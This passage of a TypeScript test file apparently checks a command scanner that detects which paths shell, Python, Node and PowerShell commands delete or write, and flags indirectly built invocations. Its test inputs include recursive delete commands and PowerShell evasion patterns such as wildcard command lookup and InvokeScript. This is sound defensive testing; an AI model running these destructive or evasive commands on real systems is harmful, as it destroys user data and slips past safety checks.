    expect(pathsOf(py("from subprocess import run; run(['cmd', '/c', 'rd', '/s', '/q', 'D:/a'])"), 'delete')).toEqual(['D:\\a'])
    expect(py('import os; os.system(c)').selfBuilding).toMatch(/cannot be read/)
    expect(py("import subprocess, sys; subprocess.run([sys.executable, '-m', 'pytest'])").selfBuilding).toBeNull()
    const js = (c: string) => scan(`node -e "${c}"`)
    expect(pathsOf(js("const f = require('fs'); f.rmSync('D:/a', {recursive: true})"), 'delete')).toEqual(['D:\\a'])
    expect(pathsOf(js("const { execSync: x } = require('child_process'); x('rd /s /q D:/a')"), 'delete')).toEqual(['D:\\a'])
    expect(pathsOf(js("require('child_process').spawnSync('cmd', ['/c', 'del', 'D:/a'])"), 'delete')).toEqual(['D:\\a'])
    expect(pathsOf(scan("bun -e \"Bun.spawn({ cmd: ['cmd', '/c', 'del', 'D:/a'] })\""), 'delete')).toEqual(['D:\\a'])
    expect(pathsOf(scan("(Get-Item C:\\Users\\u\\proj\\a).CopyTo('D:\\b')"), 'write')).toEqual(['D:\\b'])
  })
  it('indirect invocation is self-building; a call operator on a literal program is not', () => {
    expect(scan('&(gcm Remove-It*) D:\\x').selfBuilding).not.toBeNull()
    expect(scan('. $(Join-Path $x y.ps1)').selfBuilding).not.toBeNull()
    expect(scan("$ExecutionContext.InvokeCommand.InvokeScript('x')").selfBuilding).not.toBeNull()
    expect(scan("Start-Job { param($p) Remove-Item $p } -ArgumentList 'D:\\x'").selfBuilding).not.toBeNull()
    expect(scan('& "C:\\Py\\python.exe" -m pytest').selfBuilding).toBeNull()
    expect(scan('git status && (cd sub; git status)', X, XBASE).selfBuilding).toBeNull()
    expect(scan('cmd /c "dir & (echo x)"').selfBuilding).toBeNull()
  })
})
